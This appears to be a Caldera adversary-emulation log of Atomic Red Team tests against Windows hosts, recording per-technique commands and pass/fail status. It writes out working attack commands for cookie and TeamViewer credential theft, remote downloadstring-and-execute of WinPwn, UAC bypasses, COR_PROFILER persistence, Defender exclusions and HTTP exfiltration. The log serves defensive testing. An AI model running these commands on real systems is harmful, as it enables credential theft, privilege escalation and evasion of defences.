 'description': "This test queries Firefox's cookies.sqlite database to steal "
                'the cookie data contained within it, similar to '
                "Zloader/Zbot's cookie theft function. \n"
                'Note: If Firefox is running, the process will be killed to '
                "ensure that the DB file isn't locked. \n"
                'See '
                'https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf. \n',
 'executor': 'psh',
 'link_id': '8027eef3-f282-4334-858b-42857b39faf3',
 'name': 'Steal Firefox Cookies (Windows)',
 'pid': 11088,
 'plaintext_command': 'stop-process -name "firefox" -force -erroraction '
                      'silentlycontinue; $CookieDBLocation = get-childitem '
                      '-path '
                      '"$env:appdata\\Mozilla\\Firefox\\Profiles\\*\\cookies.sqlite"; '
                      '"select host, name, value, path, expiry, isSecure, '
                      'isHttpOnly, sameSite from [moz_cookies];" | cmd /c '
                      'PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite-tools-win32-x86-3380200\\sqlite3.exe '
                      '"$CookieDBLocation" | out-file -filepath '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\T1539FirefoxCookies.txt"',
 'platform': 'windows',
 'run': '2023-12-01T17:50:07Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1098__persistence__account_manipulation__bac18f187778e4202196ddd3c6041d31__trial_1

atomic_ordering: ['bac18f187778e4202196ddd3c6041d31']
==============================
==============================
adversary_id: atomic__t1574_012__multiple__hijack_execution_flow-_cor_profiler__44c554d9bf01759c8a35c8ec8eb8510d__trial_1

atomic_ordering: ['44c554d9bf01759c8a35c8ec8eb8510d']
------------------------------
{'ability_id': '44c554d9bf01759c8a35c8ec8eb8510d',
 'agent_reported_time': '2023-11-11T13:10:10Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1574.012',
            'technique_name': 'Hijack Execution Flow: COR_PROFILER'},
 'command': 'Write-Host "Creating system environment variables" '
            '-ForegroundColor Cyan; New-ItemProperty -Path '
            "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
            'Manager\\Environment\' -Name "COR_ENABLE_PROFILING" -PropertyType '
            'String -Value "1" -Force | Out-Null; New-ItemProperty -Path '
            "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
            'Manager\\Environment\' -Name "COR_PROFILER" -PropertyType String '
            '-Value "{09108e71-974c-4010-89cb-acf471ae9e2c}" -Force | '
            'Out-Null; New-ItemProperty -Path '
            "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
            'Manager\\Environment\' -Name "COR_PROFILER_PATH" -PropertyType '
            'String -Value "83f016_T1574.012x64.dll" -Force | Out-Null',
 'delegated': '2023-12-04T02:21:09Z',
 'description': 'Creates system scope environment variables to enable a .NET '
                'profiler (COR_PROFILER). System scope environment variables '
                'require a restart to take effect.\n'
                'The unmanaged profiler DLL (T1574.012x64.dll`) executes when '
                'the CLR is loaded by any process. Additionally, the profiling '
                'DLL will inherit the integrity\n'
                'level of Event Viewer bypassing UAC and executing '
                '`notepad.exe` with high integrity. If the account used is not '
                'a local administrator the profiler DLL will\n'
                'still execute each time the CLR is loaded by a process, '
                'however, the notepad process will not execute with high '
                'integrity.\n'
                '\n'
                'Reference: '
                'https://redcanary.com/blog/cor_profiler-for-persistence/\n',
 'executor': 'psh',
 'link_id': '01bbad9b-a953-4a7d-bc89-54223215092d',
 'name': 'System Scope COR_PROFILER',
 'pid': 9520,
 'plaintext_command': 'Write-Host "Creating system environment variables" '
                      '-ForegroundColor Cyan; New-ItemProperty -Path '
                      "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
                      'Manager\\Environment\' -Name "COR_ENABLE_PROFILING" '
                      '-PropertyType String -Value "1" -Force | Out-Null; '
                      'New-ItemProperty -Path '
                      "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
                      'Manager\\Environment\' -Name "COR_PROFILER" '
                      '-PropertyType String -Value '
                      '"{09108e71-974c-4010-89cb-acf471ae9e2c}" -Force | '
                      'Out-Null; New-ItemProperty -Path '
                      "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session "
                      'Manager\\Environment\' -Name "COR_PROFILER_PATH" '
                      '-PropertyType String -Value "83f016_T1574.012x64.dll" '
                      '-Force | Out-Null',
 'platform': 'windows',
 'run': '2023-12-04T02:21:15Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1082__discovery__system_information_discovery__286916316d725933021d57fb5620d644__trial_1

atomic_ordering: ['286916316d725933021d57fb5620d644']
------------------------------
{'ability_id': '286916316d725933021d57fb5620d644',
 'agent_reported_time': '2023-11-11T13:10:06Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1082',
            'technique_name': 'System Information Discovery'},
 'command': 'iex(new-object '
            "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1'); "
            'Invoke-watson',
 'delegated': '2023-11-29T00:42:36Z',
 'description': 'PowerSharpPack - Watson searching for missing windows '
                'patches  technique via function of WinPwn',
 'executor': 'psh',
 'link_id': '93a0cb6d-4209-40a6-82df-90914430c188',
 'name': 'WinPwn - PowerSharpPack - Watson searching for missing windows '
         'patches',
 'pid': 5528,
 'plaintext_command': 'iex(new-object '
                      "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1'); "
                      'Invoke-watson',
 'platform': 'windows',
 'run': '2023-11-29T00:42:54Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1219__command-and-control__remote_access_software__396dae93ab07f7c93853def404fefebf__trial_1

atomic_ordering: ['396dae93ab07f7c93853def404fefebf']
------------------------------
{'ability_id': '396dae93ab07f7c93853def404fefebf',
 'agent_reported_time': '2023-11-11T13:09:58Z',
 'attack': {'tactic': 'command-and-control',
            'technique_id': 'T1219',
            'technique_name': 'Remote Access Software'},
 'command': 'Start-Process '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\T1219_NetSupport.exe" '
            '-ArgumentList "/S /v/qn"',
 'delegated': '2023-12-01T04:33:56Z',
 'description': 'A recent trend by threat actors, once a foothold is '
                'established, maintain long term persistence using third party '
                'remote services such as NetSupport to provide the operator '
                'with access to the network using legitimate services. \n',
 'executor': 'psh',
 'link_id': 'a2239972-013e-42a2-813a-001f9ca1c292',
 'name': 'NetSupport - RAT Execution',
 'pid': 7136,
 'plaintext_command': 'Start-Process '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\T1219_NetSupport.exe" '
                      '-ArgumentList "/S /v/qn"',
 'platform': 'windows',
 'run': '2023-12-01T04:34:05Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1055_011__multiple__process_injection-_extra_window_memory_injection__a8a3487e477e0c1501ceb0239b5cad15__trial_1

atomic_ordering: ['a8a3487e477e0c1501ceb0239b5cad15']
------------------------------
{'ability_id': 'a8a3487e477e0c1501ceb0239b5cad15',
 'agent_reported_time': '2023-11-11T13:10:36Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1055.011',
            'technique_name': 'Process Injection: Extra Window Memory '
                              'Injection'},
 'command': '4a3cbc_T1055.011_x64.exe',
 'delegated': '2023-11-28T01:28:59Z',
 'description': 'Hooks functions of main process to inject a payload via Extra '
                'Window Memory (EWM) injection technique',
 'executor': 'psh',
 'link_id': '1397bfb9-7de6-49c4-bf4d-be6b2d54c2ae',
 'name': 'Process Injection via Extra Window Memory (EWM) x64 executable',
 'pid': 8432,
 'plaintext_command': '4a3cbc_T1055.011_x64.exe',
 'platform': 'windows',
 'run': '2023-11-28T01:30:02Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1136_003__persistence__create_account-_cloud_account__a976d2bc6da0471ddf8e3583ce4f7ed7__trial_1

atomic_ordering: ['a976d2bc6da0471ddf8e3583ce4f7ed7']
==============================
==============================
adversary_id: atomic__t1574_012__multiple__hijack_execution_flow-_cor_profiler__07b384a102f27412c1475421f4534f29__trial_1

atomic_ordering: ['07b384a102f27412c1475421f4534f29']
------------------------------
{'ability_id': '07b384a102f27412c1475421f4534f29',
 'agent_reported_time': '2023-11-11T13:10:47Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1574.012',
            'technique_name': 'Hijack Execution Flow: COR_PROFILER'},
 'command': 'Write-Host "Creating registry keys in '
            'HKCU:Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}" '
            '-ForegroundColor Cyan; New-Item -Path '
            '"HKCU:\\Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\\InprocServer32" '
            '-Value "83f016_T1574.012x64.dll" -Force | Out-Null; '
            'New-ItemProperty -Path HKCU:\\Environment -Name '
            '"COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | '
            'Out-Null; New-ItemProperty -Path HKCU:\\Environment -Name '
            '"COR_PROFILER" -PropertyType String -Value '
            '"{09108e71-974c-4010-89cb-acf471ae9e2c}" -Force | Out-Null; '
            'New-ItemProperty -Path HKCU:\\Environment -Name '
            '"COR_PROFILER_PATH" -PropertyType String -Value '
            '"83f016_T1574.012x64.dll" -Force | Out-Null; Write-Host '
            '"executing eventvwr.msc" -ForegroundColor Cyan; START MMC.EXE '
            'EVENTVWR.MSC',
 'delegated': '2023-12-04T02:01:01Z',
 'description': 'Creates user scope environment variables and CLSID COM object '
                'to enable a .NET profiler (COR_PROFILER).\n'
                'The unmanaged profiler DLL (`T1574.012x64.dll`) executes when '
                'the CLR is loaded by the Event Viewer process.\n'
                'Additionally, the profiling DLL will inherit the integrity '
                'level of Event Viewer bypassing UAC and executing '
                '`notepad.exe` with high integrity.\n'
                'If the account used is not a local administrator the profiler '
                'DLL will still execute each time the CLR is loaded by a '
                'process, however,\n'
                'the notepad process will not execute with high integrity.\n'
                '\n'
                'Reference: '
                'https://redcanary.com/blog/cor_profiler-for-persistence/\n',
 'executor': 'psh',
 'link_id': 'b7bf21f8-ad16-4c2d-b84d-8bac2f3d109f',
 'name': 'User scope COR_PROFILER',
 'pid': 5528,
 'plaintext_command': 'Write-Host "Creating registry keys in '
                      'HKCU:Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}" '
                      '-ForegroundColor Cyan; New-Item -Path '
                      '"HKCU:\\Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\\InprocServer32" '
                      '-Value "83f016_T1574.012x64.dll" -Force | Out-Null; '
                      'New-ItemProperty -Path HKCU:\\Environment -Name '
                      '"COR_ENABLE_PROFILING" -PropertyType String -Value "1" '
                      '-Force | Out-Null; New-ItemProperty -Path '
                      'HKCU:\\Environment -Name "COR_PROFILER" -PropertyType '
                      'String -Value "{09108e71-974c-4010-89cb-acf471ae9e2c}" '
                      '-Force | Out-Null; New-ItemProperty -Path '
                      'HKCU:\\Environment -Name "COR_PROFILER_PATH" '
                      '-PropertyType String -Value "83f016_T1574.012x64.dll" '
                      '-Force | Out-Null; Write-Host "executing eventvwr.msc" '
                      '-ForegroundColor Cyan; START MMC.EXE EVENTVWR.MSC',
 'platform': 'windows',
 'run': '2023-12-04T02:02:01Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1098__persistence__account_manipulation__b3aef1cccb10fc2ecf00bc80646ef8fe__trial_1

atomic_ordering: ['b3aef1cccb10fc2ecf00bc80646ef8fe']
==============================
==============================
adversary_id: atomic__t1518_001__discovery__software_discovery-_security_software_discovery__d8dbc446fea6514a712803194b10cb75__trial_1

atomic_ordering: ['d8dbc446fea6514a712803194b10cb75']
------------------------------
{'ability_id': 'd8dbc446fea6514a712803194b10cb75',
 'agent_reported_time': '2023-11-11T13:10:16Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1518.001',
            'technique_name': 'Software Discovery: Security Software '
                              'Discovery'},
 'command': 'Get-Service WinDefend; Get-MpComputerStatus; Get-MpThreat',
 'delegated': '2023-12-01T13:18:37Z',
 'description': 'Windows Defender Enumeration via different built-in windows '
                'native tools.\n'
                'when sucessfully executed, information about windows defender '
                'is displayed.\n',
 'executor': 'psh',
 'link_id': 'fff97c24-d1ec-43b5-9e1f-6b3054fcaec9',
 'name': 'Security Software Discovery - Windows Defender Enumeration',
 'pid': 7444,
 'plaintext_command': 'Get-Service WinDefend; Get-MpComputerStatus; '
                      'Get-MpThreat',
 'platform': 'windows',
 'run': '2023-12-01T13:19:14Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1112__defense-evasion__modify_registry__7a6e495200cd37c66f02e7bc070b61a9__trial_1

atomic_ordering: ['7a6e495200cd37c66f02e7bc070b61a9']
------------------------------
{'ability_id': '7a6e495200cd37c66f02e7bc070b61a9',
 'agent_reported_time': '2023-11-11T13:10:29Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1112',
            'technique_name': 'Modify Registry'},
 'command': '$key= '
            '"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet '
            'Settings\\ZoneMap\\Domains\\bad-domain.com\\"; $name '
            '="bad-subdomain"; new-item $key -Name $name -Force; '
            'new-itemproperty $key$name -Name https -Value 2 -Type DWORD; '
            'new-itemproperty $key$name -Name http  -Value 2 -Type DWORD; '
            'new-itemproperty $key$name -Name *     -Value 2 -Type DWORD;',
 'delegated': '2023-11-30T00:13:57Z',
 'description': 'Attackers may add a domain to the trusted site zone to bypass '
                'defenses. Doing this enables attacks such as c2 over '
                'office365.\n'
                'Upon execution, details of the new registry entries will be '
                'displayed.\n'
                'Additionally, open Registry Editor to view the modified entry '
                'in '
                'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet '
                'Settings\\ZoneMap\\.\n'
                '\n'
                'https://www.blackhat.com/docs/us-17/wednesday/us-17-Dods-Infecting-The-Enterprise-Abusing-Office365-Powershell-For-Covert-C2.pdf\n',
 'executor': 'psh',
 'link_id': 'fe5ccffe-2ef5-4f4d-a4b6-8d092120ef26',
 'name': 'Add domain to Trusted sites Zone',
 'pid': 10248,
 'plaintext_command': '$key= '
                      '"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet '
                      'Settings\\ZoneMap\\Domains\\bad-domain.com\\"; $name '
                      '="bad-subdomain"; new-item $key -Name $name -Force; '
                      'new-itemproperty $key$name -Name https -Value 2 -Type '
                      'DWORD; new-itemproperty $key$name -Name http  -Value 2 '
                      '-Type DWORD; new-itemproperty $key$name -Name *     '
                      '-Value 2 -Type DWORD;',
 'platform': 'windows',
 'run': '2023-11-30T00:14:53Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1548_002__multiple__abuse_elevation_control_mechanism-_bypass_user_account_control__f91d7dfb1e6fd4fa742f24927ca4af26__trial_1

atomic_ordering: ['f91d7dfb1e6fd4fa742f24927ca4af26']
------------------------------
{'ability_id': 'f91d7dfb1e6fd4fa742f24927ca4af26',
 'agent_reported_time': '2023-11-11T13:10:42Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1548.002',
            'technique_name': 'Abuse Elevation Control Mechanism: Bypass User '
                              'Account Control'},
 'command': 'New-Item '
            '"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command" '
            '-Force; New-ItemProperty '
            '"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command" '
            '-Name "DelegateExecute" -Value "" -Force; Set-ItemProperty '
            '"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command" '
            '-Name "(default)" -Value "C:\\Windows\\System32\\cmd.exe" -Force; '
            'Start-Process "C:\\Windows\\System32\\ComputerDefaults.exe"',
 'delegated': '2023-12-02T13:10:01Z',
 'description': 'PowerShell code to bypass User Account Control using '
                'ComputerDefaults.exe on Windows 10\n'
                'Upon execution administrative command prompt should open\n',
 'executor': 'psh',
 'link_id': '40806904-06da-4fe2-a1ff-6a584b243c07',
 'name': 'Bypass UAC using ComputerDefaults (PowerShell)',
 'pid': 8972,
 'plaintext_command': 'New-Item '
                      '"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command" '
                      '-Force; New-ItemProperty '
                      '"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command" '
                      '-Name "DelegateExecute" -Value "" -Force; '
                      'Set-ItemProperty '
                      '"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command" '
                      '-Name "(default)" -Value '
                      '"C:\\Windows\\System32\\cmd.exe" -Force; Start-Process '
                      '"C:\\Windows\\System32\\ComputerDefaults.exe"',
 'platform': 'windows',
 'run': '2023-12-02T13:10:50Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1552_001__credential-access__unsecured_credentials-_credentials_in_files__58351281e64f2182ac4f8b44f63e9042__trial_1

atomic_ordering: ['58351281e64f2182ac4f8b44f63e9042']
------------------------------
{'ability_id': '58351281e64f2182ac4f8b44f63e9042',
 'agent_reported_time': '2023-11-11T13:10:27Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1552.001',
            'technique_name': 'Unsecured Credentials: Credentials In Files'},
 'command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
            'iex(new-object '
            "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
            'Snaffler -noninteractive -consoleoutput',
 'delegated': '2023-12-02T14:27:55Z',
 'description': 'Check Domain Network-Shares for cleartext passwords using '
                'Snaffler function of WinPwn',
 'executor': 'psh',
 'link_id': 'f8dec0dc-9609-442d-9662-5707f07ccfce',
 'name': 'WinPwn - Snaffler',
 'pid': 8972,
 'plaintext_command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
                      'iex(new-object '
                      "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
                      'Snaffler -noninteractive -consoleoutput',
 'platform': 'windows',
 'run': '2023-12-02T14:28:41Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__5c4ea84c2b050f1f8b6f880755ccbc62__trial_1

atomic_ordering: ['5c4ea84c2b050f1f8b6f880755ccbc62']
------------------------------
{'ability_id': '5c4ea84c2b050f1f8b6f880755ccbc62',
 'agent_reported_time': '2023-11-11T13:09:38Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1562.001',
            'technique_name': 'Impair Defenses: Disable or Modify Tools'},
 'command': '$excludedpath= "C:\\Temp"; Add-MpPreference -ExclusionPath '
            '$excludedpath',
 'delegated': '2023-12-03T11:29:12Z',
 'description': 'Malware can exclude a specific path from being scanned and '
                'evading detection. \n'
                'Upon successul execution, the file provided should be on the '
                'list of excluded path. \n'
                'To check the exclusion list using poweshell '
                '(Get-MpPreference).ExclusionPath \n',
 'executor': 'psh',
 'link_id': '16192c87-d74f-4edc-abd1-15e58c69ffa5',
 'name': 'Tamper with Windows Defender Evade Scanning -Folder',
 'pid': 6640,
 'plaintext_command': '$excludedpath= "C:\\Temp"; Add-MpPreference '
                      '-ExclusionPath $excludedpath',
 'platform': 'windows',
 'run': '2023-12-03T11:29:23Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1555__credential-access__credentials_from_password_stores__f6867f2b9b1b3c2eb733ad7ce7438f04__trial_1

atomic_ordering: ['f6867f2b9b1b3c2eb733ad7ce7438f04']
------------------------------
{'ability_id': 'f6867f2b9b1b3c2eb733ad7ce7438f04',
 'agent_reported_time': '2023-11-11T13:10:02Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1555',
            'technique_name': 'Credentials from Password Stores'},
 'command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
            'iex(new-object '
            "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
            'decryptteamviewer -consoleoutput -noninteractive',
 'delegated': '2023-12-03T03:45:57Z',
 'description': 'Loot local Credentials - Decrypt Teamviewer Passwords '
                'technique via function of WinPwn',
 'executor': 'psh',
 'link_id': 'e959589f-b684-4ef9-940d-8d284837bc1a',
 'name': 'WinPwn - Loot local Credentials - Decrypt Teamviewer Passwords',
 'pid': 9236,
 'plaintext_command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
                      'iex(new-object '
                      "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
                      'decryptteamviewer -consoleoutput -noninteractive',
 'platform': 'windows',
 'run': '2023-12-03T03:46:07Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1048_003__exfiltration__exfiltration_over_alternative_protocol-_exfiltration_over_unencrypted,obfuscated_non-c2_protocol__548a620bf3463f72a42937faf7614935__trial_1

atomic_ordering: ['548a620bf3463f72a42937faf7614935']
------------------------------
{'ability_id': '548a620bf3463f72a42937faf7614935',
 'agent_reported_time': '2023-11-11T13:09:47Z',
 'attack': {'tactic': 'exfiltration',
            'technique_id': 'T1048.003',
            'technique_name': 'Exfiltration Over Alternative Protocol: '
                              'Exfiltration Over Unencrypted/Obfuscated Non-C2 '
                              'Protocol'},
 'command': '$content = Get-Content C:\\Windows\\System32\\notepad.exe; '
            'Invoke-WebRequest -Uri http://127.0.0.1 -Method POST -Body '
            '$content',
 'delegated': '2023-11-27T20:21:39Z',
 'description': 'Exfiltration of specified file over HTTP.\n'
                'Upon successful execution, powershell will invoke web request '
                'using POST method to exfiltrate notepad.exe to a remote '
                'address (default http://127.0.0.1). Results will be via '
                'stdout.\n',
 'executor': 'psh',
 'link_id': 'd5f8b710-2d85-4eef-9cfa-72c74e14b709',
 'name': 'Exfiltration Over Alternative Protocol - HTTP',
 'pid': 6860,
 'plaintext_command': '$content = Get-Content '
                      'C:\\Windows\\System32\\notepad.exe; Invoke-WebRequest '
                      '-Uri http://127.0.0.1 -Method POST -Body $content',
 'platform': 'windows',
 'run': '2023-11-27T20:22:18Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1059_005__execution__command_and_scripting_interpreter-_visual_basic__42302f7d89c15f8070f83e743771d567__trial_1

atomic_ordering: ['42302f7d89c15f8070f83e743771d567']
------------------------------
{'ability_id': '42302f7d89c15f8070f83e743771d567',
 'agent_reported_time': '2023-11-11T13:10:26Z',
 'attack': {'tactic': 'execution',
            'technique_id': 'T1059.005',
            'technique_name': 'Command and Scripting Interpreter: Visual '
                              'Basic'},
 'command': '[Net.ServicePointManager]::SecurityProtocol = '
            '[Net.SecurityProtocolType]::Tls12; IEX (iwr '
            '"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" '
            '-UseBasicParsing) ; Invoke-Maldoc -macroFile '
            '"PathToAtomicsFolder\\T1059.005\\src\\T1059_005-macrocode.txt" '
            '-officeProduct "Word" -sub "Extract"',
 'delegated': '2023-11-28T10:31:36Z',
 'description': 'This module attempts to emulate malware authors utilizing '
                'well known techniques to extract data from memory/binary '
                'files. To do this\n'
                'we first create a string in memory then pull out the pointer '
                'to that string. Finally, it uses this pointer to copy the '
                'contents of that\n'
                'memory location to a file stored in the '
                '$env:TEMP\\atomic_t1059_005_test_output.bin.\n',
 'executor': 'psh',
 'link_id': '6ebf8366-7194-4a38-9ad1-fdfccf6a9562',
 'name': 'Extract Memory via VBA',
 'pid': 1028,
 'plaintext_command': '[Net.ServicePointManager]::SecurityProtocol = '
                      '[Net.SecurityProtocolType]::Tls12; IEX (iwr '
                      '"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" '
                      '-UseBasicParsing) ; Invoke-Maldoc -macroFile '
                      '"PathToAtomicsFolder\\T1059.005\\src\\T1059_005-macrocode.txt" '
                      '-officeProduct "Word" -sub "Extract"',
 'platform': 'windows',
 'run': '2023-11-28T10:32:23Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1570__lateral-movement__lateral_tool_transfer__4de0ba1566249a72e81e74707cc91a00__trial_1

atomic_ordering: ['4de0ba1566249a72e81e74707cc91a00']
------------------------------
{'ability_id': '4de0ba1566249a72e81e74707cc91a00',
 'agent_reported_time': '2023-11-11T13:10:11Z',
 'attack': {'tactic': 'lateral-movement',
            'technique_id': 'T1570',
            'technique_name': 'Lateral Tool Transfer'},
 'command': "New-SmbMapping -RemotePath '\\\\example.com\\sales' "
            '-TransportType QUIC -SkipCertificateCheck; copy '
            "'C:\\path\\to\\file.txt' 'Z:\\'",
 'delegated': '2023-12-03T22:48:52Z',
 'description': 'Simulates an attacker exfiltrating data over SMB over QUIC '
                'using the New-SmbMapping command.\n'
                'Prerequisites:\n'
                '  - A file server running Windows Server 2022 Datacenter: '
                'Azure Edition\n'
                '  - A Windows 11 computer\n'
                '  - Windows Admin Center\n',
 'executor': 'psh',
 'link_id': '36eaaff3-93e5-46e8-9259-6619d73a995c',
 'name': 'Exfiltration Over SMB over QUIC (New-SmbMapping)',
 'pid': 10456,
 'plaintext_command': "New-SmbMapping -RemotePath '\\\\example.com\\sales' "
                      '-TransportType QUIC -SkipCertificateCheck; copy '
                      "'C:\\path\\to\\file.txt' 'Z:\\'",
 'platform': 'windows',
 'run': '2023-12-03T22:49:27Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1091__multiple__replication_through_removable_media__95f9e48ea1fbdac2f1c7c656b655ae4c__trial_1

atomic_ordering: ['95f9e48ea1fbdac2f1c7c656b655ae4c']
------------------------------
{'ability_id': '95f9e48ea1fbdac2f1c7c656b655ae4c',
 'agent_reported_time': '2023-11-11T13:10:52Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1091',
            'technique_name': 'Replication Through Removable Media'},
 'command': '$RemovableDrives=@(); $RemovableDrives = Get-WmiObject -Class '
            'Win32_LogicalDisk -filter "drivetype=2" | select-object '
            '-expandproperty DeviceID; ForEach ($Drive in $RemovableDrives); '
            '{; write-host "Removable Drive Found:" $Drive; New-Item -Path '
            '$Drive/T1091Test1.txt -ItemType "file" -Force -Value "T1091 Test '
            '1 has created this file to simulate malware spread to removable '
            'drives."; }',
 'delegated': '2023-11-29T09:45:12Z',
 'description': 'Simulates an adversary copying malware to all connected '
                'removable drives. \n',
 'executor': 'psh',
 'link_id': '6c0056b1-fe6f-4ec1-a257-ea6ad4716b9b',
 'name': 'USB Malware Spread Simulation',
 'pid': 7344,
 'plaintext_command': '$RemovableDrives=@(); $RemovableDrives = Get-WmiObject '
                      '-Class Win32_LogicalDisk -filter "drivetype=2" | '
                      'select-object -expandproperty DeviceID; ForEach ($Drive '
                      'in $RemovableDrives); {; write-host "Removable Drive '
                      'Found:" $Drive; New-Item -Path $Drive/T1091Test1.txt '
                      '-ItemType "file" -Force -Value "T1091 Test 1 has '
                      'created this file to simulate malware spread to '
                      'removable drives."; }',
 'platform': 'windows',
 'run': '2023-11-29T09:46:07Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1548_002__multiple__abuse_elevation_control_mechanism-_bypass_user_account_control__f27b37f253617c39ac010d2ee1238b7e__trial_1

atomic_ordering: ['f27b37f253617c39ac010d2ee1238b7e']
------------------------------
{'ability_id': 'f27b37f253617c39ac010d2ee1238b7e',
 'agent_reported_time': '2023-11-11T13:10:09Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1548.002',
            'technique_name': 'Abuse Elevation Control Mechanism: Bypass User '
                              'Account Control'},
 'command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
            'iex(new-object '
            "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
            'UACBypass -noninteractive -command '
            '"C:\\windows\\system32\\cmd.exe" -technique DiskCleanup',
 'delegated': '2023-12-02T12:31:11Z',
 'description': 'UAC bypass using DiskCleanup technique via function of WinPwn',
 'executor': 'psh',
 'link_id': 'c85f00a4-9748-451b-8660-0e6eb688bc99',
 'name': 'WinPwn - UAC Bypass DiskCleanup technique',
 'pid': 5528,
 'plaintext_command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
                      'iex(new-object '
                      "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
                      'UACBypass -noninteractive -command '
                      '"C:\\windows\\system32\\cmd.exe" -technique DiskCleanup',
 'platform': 'windows',
 'run': '2023-12-02T12:31:31Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
Techniques that didn't run at all due to all-dead-agents problem 59 out of 524:


operation_a2039e6f-a126-4bcb-870c-7e026ab7926a
operation_913110e2-5e9d-4125-8dee-ea1850e415e0
operation_743f6e74-316f-403f-b93c-4aa31ab57492
operation_144da5ab-f3fb-45c8-b7a1-77f4a6aa2c26
